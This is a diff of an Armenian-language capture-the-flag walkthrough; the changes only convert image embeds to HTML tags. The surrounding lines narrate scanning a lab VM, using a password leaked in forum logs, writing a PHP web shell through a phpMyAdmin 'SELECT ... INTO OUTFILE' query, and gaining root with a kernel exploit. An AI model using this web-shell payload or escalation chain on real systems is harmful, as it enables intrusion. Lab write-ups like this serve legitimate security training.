@@ -26,7 +26,7 @@ Currently scanning: Finished!   |   Screen View: Unique Hosts
 2-րդը իմ մյուս ռոուտերնա
 3-րդը թիվիսա
 4-րդը չգիտեմ դեռ, մտնենք բրաուզերով տեսնենք․
-![[img/Pasted image 20240704110727.png]]
+<img src="img/Pasted image 20240704110727.png">
 ըհն, կարծենք գտանք մեր մեքենայի ip-ն․ բայց շատ դատարկա առաջին հայացքից․ արժի directory ները փարս անել, տեսնենք ինչ կա չկա։
 
 դրա համար կարանք օգտագործենք **dirb** թուլը
@@ -66,7 +66,7 @@ DOWNLOADED: 4612 - FOUND: 4
 տեսնում ենք, որ կա մի հատ /forum որի ստատուս կոդը 403 ա (forbidden)
 քանի որ մենք միայն http ով էինք սկան արել, եկեք մի հատ https ով փորձենք
 աշխարհի output ը տվեց, մինչ սա լինումա, կարանք արդեն https ով ֆորումը մտնենք։
-![[img/Pasted image 20240704112010.png]]
+<img src="img/Pasted image 20240704112010.png">
 մինչ էս ամենը կուսումնասիրենք, կարանք **nmap** դնենք աշխատի էս մեր ip ի համար․
 **nmap**-ը գործիքա, որը սկանա անում մեր տված ip ի բաց պորտերը, ու իրանց մասին ինֆոյա տալիս․ էս վափշե սկզբում պետքա անեինք, ուղղակի ես տարիքով մարդ եմ, մոռացել էի․
 ```
@@ -75,21 +75,21 @@ sudo nmap 192.168.1.12 -sS -sV -sC -v &>out
 
 մինչ սկանա լինում,  **Probleme login ?** էջում հետաքրքիր լոգեր ենք տեսնում, որ lmezard user ը ուզումա լոգին լինի, չի ստացվում․ ու որ բրաուզերի ֆունկցիաներից օգտվելով search անենք էդ username ը, կտեսնենք սա.
 
-![[img/Pasted image 20240704112903.png]]
+<img src="img/Pasted image 20240704112903.png">
 տեսնում ենք էս լոգերից, որ էդ user ը միամիտ իրա password նա գրել, որպես username ու ֆեյլ ա տվել․
 
 կայքում լոգին լինելու տեղ կա, էկեք դրանով փորձենք
-![[img/Pasted image 20240704113729.png]]
+<img src="img/Pasted image 20240704113729.png">
 ու թույն, լոգին էղանք
 **dirb**-ի output ում նաև կար webmail-ը
-![[img/Pasted image 20240704114314.png]]
+<img src="img/Pasted image 20240704114314.png">
 lmezard ով լոգին չեղավ, բայց եթե մեր ֆորումից նայենք մեր user ի մեյլը, կտեսնենք սա
-![[img/Pasted image 20240704120557.png]]
+<img src="img/Pasted image 20240704120557.png">
 
 էս մեյլով լոգին լինելը ստացվեց, ու մի հետաքրքիր նամակ ենք տեսնում ստեղ
-![[img/Pasted image 20240704120634.png]]
+<img src="img/Pasted image 20240704120634.png">
 ու երբ որ մտնենք phpmyadmin
-![[img/Pasted image 20240704120741.png]]
+<img src="img/Pasted image 20240704120741.png">
 էս մեյլի տված փասսվորդով կկարենանք լոգին լինենք
 
 ու էստեղ ունենք sql կոդ գրելու հնարավորություն, ու 40 տարի տանջվելուց և Slack ով ուռիշ մարդկանցից ճշտելլուց հետո հասկացա, որ մենք permission ունենք մենք templates_c folder-ում
@@ -97,7 +97,7 @@ lmezard ով լոգին չեղավ, բայց եթե մեր ֆորումից նա
 ```
 SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/gago.php'
 ```
-![[img/Pasted image 20240704122427.png]]
+<img src="img/Pasted image 20240704122427.png">
 ըհն, ստացանք սա․
 
 հիմա եկեք տեսնենք ինչեր կան ստեղ
@@ -143,9 +143,9 @@ password
 
 էս լոգին փասսով ցավոք ssh ով լոգին չենք կարում լինենք, բայց vm ով կարում ենք
 
-![[img/Pasted image 20240712001204.png]]
+<img src="img/Pasted image 20240712001204.png">
 անենք uname -a տեսնենք ինչ կեռնելա, որովհետև տատուցս տարիքով մի քիչա փոքր էս iso ի ֆայլը
-![[img/Pasted image 20240712001336.png]]
+<img src="img/Pasted image 20240712001336.png">
 ու մի փոքր գուգլելուց հետո **linux 3.2 cve** հանդիպեցի էս լինքին
 https://www.cybersecurity-help.cz/exploits/1039/?ref=bulletin
 ու գտա github ից էս exploit ը
@@ -190,10 +190,10 @@ exploit-ը օգտագործելու ձևը գրած ա ֆայլում
 
 compile անենք, ու run անենք
 
-![[img/Pasted image 20240712004026.png]]
+<img src="img/Pasted image 20240712004026.png">
 կարծենք ստացվեց․ էկեք փորձենք լոգին լինենք․ էս սկրիպտը username ը փոխումա, էդիթ կանեմ, իմ ֆայլերի մեջ root ով կգցեմ, որ հետո չասեք բա խի root չի, չնայելով, որ id-ն 0-նա։
-![[img/Pasted image 20240712004305.png]]
+<img src="img/Pasted image 20240712004305.png">
 կարաք շնորհավորեք, ունենք root.
 
-![[img/Pasted image 20240712011419.png]]
+<img src="img/Pasted image 20240712011419.png">
 (էս էլ փոխած կոդը, որը գտնվում ա /scripts folder-ի մեջ)
